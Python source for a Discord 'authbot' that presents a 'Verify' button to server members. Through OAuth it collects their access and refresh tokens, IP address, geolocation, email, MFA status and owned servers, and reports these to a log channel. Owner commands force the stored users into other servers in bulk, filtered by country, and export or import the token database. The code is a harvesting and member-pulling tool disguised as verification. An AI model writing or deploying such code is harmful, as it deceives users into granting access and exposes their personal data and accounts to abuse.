import requests
import logging
import discord
import asyncio
import aiohttp
import shutil
import json
import time
import os

from quart import Quart, redirect, request, render_template
from pystyle import Write, Colors

with open('config.json', 'r') as f:
    config = json.load(f)

__title__ = "kno's authbot"
__author__ = "knockstick"
__version__ = "1.2"

token = config['token']
redirect_uri = config['redirect_uri']
client_secret = config['client_secret']
client_id = config['client_id']
scope = config['scope']
owners = config['owners']
admins = config['admin_guilds']
log_channel = config['log_channel']

quart_logging = config['server_logging']

server_host = config['server_host']
server_port = config['server_port']

if not quart_logging:
    logging.getLogger('hypercorn.access').disabled = True

API_VER = "v9"
DISCORD_API = "https://discord.com/api/"
ENDPOINT = DISCORD_API + API_VER

LOGIN_URL = DISCORD_API + f"oauth2/authorize/?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope={scope}"
LOGIN_REDIRECT = f"https://discord.com/oauth2/authorize/?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope={scope}"
TOKEN_URL = DISCORD_API + "oauth2/token"


def get_ip_info(ip_address):
    url = f"http://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        country = data.get('country', 'N/A')
        region = data.get('region', 'N/A')
        isp = data.get('org', 'N/A')
        return country, region, isp
    else:
        return 'N/A', 'N/A', 'N/A'
    

async def get_token(code, redirect_uri, session):
    payload = {
        "client_id": client_id,
        "client_secret": client_secret,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": redirect_uri,
        "scope": scope
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    access_token = await session.post(url=TOKEN_URL, data=payload, headers=headers)
    return await access_token.json()


async def get_userdata(access_token, session):
    url = f"{DISCORD_API}/users/@me"
    guilds_url = f"{DISCORD_API}/users/@me/guilds"

    headers = {"Authorization": f"Bearer {access_token}"}

    userdata_response = await session.get(url=url, headers=headers)
    userdata = await userdata_response.json()

    guild_data_response = await session.get(url=guilds_url, headers=headers)
    if guild_data_response.status == 200:
        guild_data = await guild_data_response.json()
        return userdata, guild_data
    elif guild_data_response.status == 401:
        return userdata, []
    elif userdata_response.status == 401:
        raise Exception("unauthorized")
    else:
        return userdata


async def refresh_token(refresh_token, session):
    data = {
        'client_id': client_id,
        'client_secret': client_secret,
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    r = await session.post(TOKEN_URL, data=data, headers=headers)
    json_resp = await r.json()

    return json_resp


async def update_data_file(user_id, refresh_token, access_token, ip, country):
    try:
        with open('data.json', 'r') as file:
            data = json.load(file)
    except FileNotFoundError:
        data = {"users": {}}

    if refresh_token not in data["users"]:
        data["users"][refresh_token] = {"id": user_id, "at": access_token, "ip": ip, "co": country.lower()}

        with open('data.json', 'w') as file:
            json.dump(data, file)
        return "new user"
    else:
        return "already authed"


async def pull(ctx, server_id, amount=None, country=None):
    session = aiohttp.ClientSession()
    success = 0
    fail = 0
    already_in_server = 0
    total = 0

    with open('data.json', 'r') as f:
        data1 = json.load(f)

    keys = list(data1["users"].keys())

    if amount is not None and amount > 0:
        keys = keys[:amount]

    for refresh_token2 in keys:
        user_data = data1["users"][refresh_token2]
        user_id = user_data["id"]

        user_country = user_data.get("co", None)
        user_ip = user_data.get("ip", "127.0.0.1")

        if country is not None and (user_country is None or user_country.lower() != country.lower()):
            continue

        refresh_json = await refresh_token(refresh_token2, session)

        at = refresh_json.get("access_token")
        rt = refresh_json.get("refresh_token")

        if at is None and rt is None:
            continue

        data1["users"][rt] = {"id": user_id, "at": at, "ip": user_ip, "co": user_country if user_country is not None else "n/a"}
        del data1["users"][refresh_token2]

        with open('data.json', 'w') as f:
            json.dump(data1, f)

        url = f'https://discord.com/api/guilds/{server_id}/members/{user_id}'
        data = {
            'access_token': at
        }
        headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        try:
            r = await session.put(url, json=data, headers=headers)
            if r.status in (200, 201):
                success += 1
            elif r.status == 204:
                already_in_server += 1
            else:
                fail += 1
        except Exception as e:
            fail += 1
            continue
        finally:
            total += 1
            await asyncio.sleep(1)

    if fail > success:
        color = discord.Color.red()
    else:
        color = discord.Color.green()

    embed = discord.Embed(title="Pull results", color=color)

    embed.description = f"**Pull to `{bot.get_guild(int(server_id)).name}`**\n"
    if country is not None:
        embed.description += f"**Pulled only members from country: `{country.upper()}`**\n\n"
    embed.description += f":ballot_box_with_check: **Already in server: `{already_in_server}`**\n"
    embed.description += f":white_check_mark: **Success: `{success}`**\n"
    embed.description += f":x: **Fail: `{fail}`**\n\n"
    embed.description += f":information: **Total users pulled: `{total}`**"

    embed.set_footer(text="kno's authbot")

    await ctx.respond(
        content=f"{ctx.author.mention} Pulling ended!",
        embed=embed,
        ephemeral=True
    )

    await session.close()
    return {"status": "success"}



class Bot(discord.Bot):
    def __init__(self, description=None, *args, **kwargs):
        super().__init__(description, *args, **kwargs)
        self.app = kwargs.get("app")
        self.loop = asyncio.get_event_loop()
        self.pulling = False

    def run(self):
        self.loop.create_task(self.app.run_task(port=int(server_port), host=server_host))
        self.loop.create_task(self.start(token))
        self.loop.run_forever()

app = Quart(__name__)
bot = Bot(intents=discord.Intents.all(), app=app)


@app.route('/')
async def index():
    code = request.args.get('code')
    state = request.args.get('state')

    if not code:
        return redirect(f"{LOGIN_REDIRECT}")
    
    return redirect(f"{redirect_uri}/{state}?code={code}")


@app.route('/<endpoint>')
async def login(endpoint):
    session = aiohttp.ClientSession()
    code = request.args.get('code')
    state = endpoint


    if not code:
        await session.close()
        return await render_template('index.html')
    
    access_token = await get_token(code, redirect_uri, session)
    refresh_token = access_token['refresh_token']
    
    user_data = await get_userdata(access_token['access_token'], session)

    user_json = user_data[0]
    user_guilds = user_data[1]

    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    await session.close()

    country, region, isp = get_ip_info(user_ip)
    updater = await update_data_file(user_json['id'], refresh_token, access_token['access_token'], user_ip, country)
    
    user_id = user_json['id']
    username = user_json['username']
    avatar_hash = user_json['avatar']
    global_name = user_json['global_name']
    mfa = user_json['mfa_enabled']
    locale = user_json['locale']

    if avatar_hash is not None:
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.webp?size=1024"
    else:
        avatar_url = "https://discord.com/assets/02b73275048e30fd09ac.png"

    embed = discord.Embed(title=":star: New authed user!", description=None)
    embed.set_thumbnail(url=avatar_url)

    embed.add_field(name=":bust_in_silhouette: User", value=f"{username if global_name is None else global_name} ({username})", inline=False)
    embed.add_field(name=':mailbox_with_mail: Info', value=f"ID: **`{user_id}`**\nLocale: **{locale}**\nMFA: **{mfa}**", inline=False)
    embed.add_field(name=":computer: Tech", value=f"IP: ```{user_ip}```", inline=False)
    embed.add_field(name=":earth_asia: Location", value=f"Country: **{country}**\nRegion: **{region}**\nISP: **{isp}**", inline=False)

    if user_json.get('email') is not None:
        email = user_json['email']
        is_verified = user_json['verified']

        embed.set_field_at(1, name=":mailbox_with_mail: E-mail & Info", value=f"ID: **`{user_id}`**\nLocale: **{locale}**\nMFA: **{mfa}**\nEmail: **`{email}`**\nVerified: **{is_verified}**", inline=False)

    if len(user_guilds) > 0:
        owned_guilds = [guild for guild in user_guilds if guild['owner']]

        owned_guilds_field_val = "```"

        for guild in owned_guilds:
            owned_guilds_field_val += f"- {guild['name']}\n"

        owned_guilds_field_val += "```"
        embed.add_field(name=":technologist: Servers I own", value=f"{owned_guilds_field_val}", inline=False)

    if state is not None:
        try:
            embed.add_field(name=f":information: State", value=f"**{state}** ({bot.get_guild(int(state)).name if bot.get_guild(int(state)) is not None else 'Unknown guild'})")
        except ValueError:
            pass

    if updater == "new user":
        Write.Print(f"New user!\nID: {user_json['id']}\nAccess Token: {access_token['access_token']}\nRefresh Token: {refresh_token}\n", Colors.blue_to_cyan, interval=0)
        
        for guild in config['verify_guilds']:
            if str(guild) == str(state):
                verified_role_id = config['verify_guilds'].get(str(state))

                guild = bot.get_guild(int(guild))
                role = guild.get_role(int(verified_role_id))

                if role:
                    member = guild.get_member(int(user_id))
                    if member:
                        await member.add_roles(role)
                        embed.description = ":white_check_mark: Member was successfully verified."
                    else:
                        embed.description = ":x: Member not found."
                else:
                    embed.description = ":x: Role not found."
                
        await bot.get_channel(int(log_channel)).send(embed=embed)
    return await render_template('index.html')


@bot.event
async def on_ready():
    with open('data.json', 'r') as f:
        data = json.load(f)
        total_users = len(data['users'])
    banner = """
\t d8b                                                                 d8b       d8b                      
\t ?88                                                           d8P   ?88       ?88                 d8P  
\t  88b                                                       d888888P  88b       88b             d888888P
\t  888  d88'  88bd88b  d8888b  .d888b,     d888b8b  ?88   d8P  ?88'    888888b   888888b  d8888b   ?88'  
\t  888bd8P'   88P' ?8bd8P' ?88 ?8b,       d8P' ?88  d88   88   88P     88P `?8b  88P `?8bd8P' ?88  88P   
\t d88888b    d88   88P88b  d88   `?8b     88b  ,88b ?8(  d88   88b    d88   88P d88,  d8888b  d88  88b   
\td88' `?88b,d88'   88b`?8888P'`?888P'     `?88P'`88b`?88P'?8b  `?8b  d88'   88bd88'`?88P'`?8888P'  `?8b  
"""
    Write.Print(banner + '\n', Colors.purple_to_blue, interval=0)

    print(f"\t\t\t\t\tkno's authbot v{__version__}\n")

    print(f"\t\t\t\t\tLogged as {bot.user}")
    print(f"\t\t\t\t\tTotal Users: {total_users}")
    print(f"\t\t\t\t\tScopes: {scope.replace('%20', ', ')}")
    print(f"\t\t\t\t\tGuilds: {len(bot.guilds)}\n")

    Write.Print(f"\t\t\t\thttps://github.com/knockstick/knos-authbot/\n\n", Colors.blue_to_purple, interval=0)


@bot.slash_command(name="pull", description="Pull your members to desired server", guild_ids=admins)
async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Option(str, description="Server ID"), amount: discord.Option(int, description="Amount of members to pull, defaults to all your members", required=False)=None, country: discord.Option(str, description=f"Pull only members with specified country. Example: us")=None): # type: ignore
    if ctx.author.id not in owners:
        return

    guild = bot.get_guild(int(server_id))
    if guild is None:
        await ctx.respond("Guild not found! Make sure the bot is in it!", ephemeral=True)
        return
        
    t = f"Pulling started! Server: `{guild.name}`"

    if amount is not None:
        t += f"\nPulling **{amount}** members"
    if country is not None:
        t += f"\nPulling only members from **{country.upper()}**"

    await ctx.respond(t, ephemeral=True)
    await pull(ctx, server_id, amount, country)


@bot.slash_command(name="getdata", description="Get all member data", guild_ids=admins)
async def getdata(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners:
        return
    
    file = discord.File("data.json")
    await ctx.respond(content="Upload this backup using `/uploaddata`\nRemove unauthorized users using `/usercheck`", file=file, ephemeral=True)


@bot.slash_command(name="uploaddata", description="Upload your data file on the server", guild_ids=admins)
async def uploaddata(ctx: discord.ApplicationContext, file: discord.Option(discord.Attachment, description="Your data file")): # type: ignore
    if ctx.author.id not in owners:
        return

    if not file.filename.endswith('.json'):
        await ctx.respond("Invalid file format.", ephemeral=True)
        return

    try:
        file_path = os.path.join(os.getcwd(), "data.json")
        msg = await ctx.respond("Uploading...", ephemeral=True)
        await file.save(file_path)

        with open('data.json', 'r') as f:
            data = json.load(f)
            total_users = len(data.get('users', {}))

        await msg.edit_original_response(content=f"Data successfully loaded! Total users (unchecked): **{total_users}**\nWarning: If you uploaded users from another app, they will not be valid!\nStart a user check using `/usercheck`")
    except Exception as e:
        await ctx.respond(f"An error occurred while uploading the file: `{e}`", ephemeral=True)


@bot.slash_command(name="usercount", description="Get your verified users count", guild_ids=admins)
async def usercount(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners:
        return
    
    with open('data.json', 'r') as f:
        data = json.load(f)
        count = len(data["users"])

    await ctx.respond(f"Total authorized users: **{count}**\nStart a user check using `/usercheck` to get accurate user count.", ephemeral=True)


@bot.slash_command(name="verify-embed", description="Create a custom verification embed", guild_ids=admins)
async def verify_embed(ctx: discord.ApplicationContext,
                        channel_id: discord.Option(str, description="Channel ID to send the embed to"), # type: ignore
                        title: discord.Option(str, description="Embed title", required=False)="Verify", # type: ignore
                        description: discord.Option(str, description="Embed description", required=False)="Please verify by clicking the button below:", # type: ignore
                        image: discord.Option(str, description="Embed image URL", required=False)=None, # type: ignore
                        thumbnail: discord.Option(str, description="Thumbnail image URL", required=False)=None, # type: ignore
                        button_text: discord.Option(str, description="Verify button text", required=False)="Verify", # type: ignore
                        button_emoji: discord.Option(str, description="Verify button emoji ID", required=False)=None): # type: ignore
    if ctx.author.id not in owners:
        return
    
    embed = discord.Embed(title=title, description=description.replace("\\n", "\n"), color=discord.Color.embed_background())
    if image is not None:
        embed.set_image(url=image)
    if thumbnail is not None:
        embed.set_thumbnail(url=thumbnail)


    channel = bot.get_channel(int(channel_id))
    if channel is None:
        return await ctx.respond("Channel not found!", ephemeral=True)
    
    login_url_with_state = LOGIN_URL + f"&state={channel.guild.id}"

    view = discord.ui.View()
    try:
        view.add_item(discord.ui.Button(label=button_text, url=login_url_with_state, emoji=bot.get_emoji(int(button_emoji)) if button_emoji is not None else None))
    except Exception as e:
        return await ctx.respond(f'An error occurred while adding button to the view: `{e}`', ephemeral=True)

    await channel.send(embed=embed, view=view)
    await ctx.respond(":white_check_mark:", ephemeral=True)

    
@bot.slash_command(name='usercheck', description="Check your users and remove unauthorized", guild_ids=admins)
async def db_update(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners:
        return
    
    await ctx.respond("Check started! You will be mentioned when it will end.", ephemeral=True)
    channel = ctx.channel

    shutil.copyfile('data.json', 'check_copy.json')

    alive = 0
    unauthorized = 0
    failed = 0
    refreshed = 0

    current_time = time.time()
    
    with open('check_copy.json', 'r') as f:
        data = json.load(f)
        users = data.get('users', {})

    async with aiohttp.ClientSession() as session:
        updated_users = {}
        
        for user_id, user in users.items():
            access_token = user.get('at', None)
            
            try:
                if not access_token:
                    # If there's no access token, try to get it
                    refresh_result = await refresh_token(user_id, session)

                    if 'access_token' in refresh_result and 'refresh_token' in refresh_result:
                        refreshed += 1
                        alive += 1
                        new_refresh_token = refresh_result['refresh_token']
                        user['at'] = refresh_result['access_token']
                        updated_users[new_refresh_token] = user
                    elif 'error' in refresh_result and refresh_result['error'] == 'invalid_grant':
                        unauthorized += 1
                    else:
                        failed += 1
                    continue

                if 'ip' not in user:
                    user['ip'] = '127.0.0.1'
                if 'co' not in user:
                    user['co'] = 'n/a'

                userdata, guilds = await get_userdata(access_token, session)

                if 'username' in userdata:
                    alive += 1
                    updated_users[user_id] = user
                elif 'message' in userdata and userdata['message'] == '401: Unauthorized':
                    # Try to refresh the token
                    refresh_result = await refresh_token(user_id, session)

                    if 'access_token' in refresh_result and 'refresh_token' in refresh_result:
                        refreshed += 1
                        alive += 1
                        new_refresh_token = refresh_result['refresh_token']
                        user['at'] = refresh_result['access_token']
                        updated_users[new_refresh_token] = user
                    elif 'error' in refresh_result and refresh_result['error'] == 'invalid_grant':
                        unauthorized += 1
                    else:
                        failed += 1
                else:
                    failed += 1
            except Exception as ex:
                failed += 1
                logging.error(f"Unexpected error for user {user_id}: {str(ex)}")

    data['users'] = updated_users
    
    with open('data.json', 'w') as f:
        json.dump(data, f)

    os.remove('check_copy.json')
    total_seconds = time.time() - current_time
    
    def format_time(seconds):
        h = int(seconds // 3600)
        rem = seconds % 3600
        m = int(rem // 60)
        s = int(rem % 60)
        return f"{h}h {m}m {s}s"
    
    total_time = format_time(total_seconds)

    emb = discord.Embed(
        title=":white_check_mark: Check report",
        description=f":clock4: **Time elapsed: `{total_time}`**",
        color=discord.Color.embed_background()
    )

    emb.add_field(name=":busts_in_silhouette: Users", value=f"**`{len(users)}`**")
    emb.add_field(name=":partying_face: Alive", value=f"**`{alive}`**")
    emb.add_field(name=":arrows_clockwise: Tokens refreshed", value=f"**`{refreshed}`**")
    emb.add_field(name=":cry: Deauthorized", value=f"**`{unauthorized}`**")
    emb.add_field(name=":x: Failed", value=f"**`{failed}`**")

    await channel.send(content=ctx.author.mention, embed=emb)
    

try:
    bot.run()
except Exception as e:
    print(f"Unhandled error running bot: {e}")
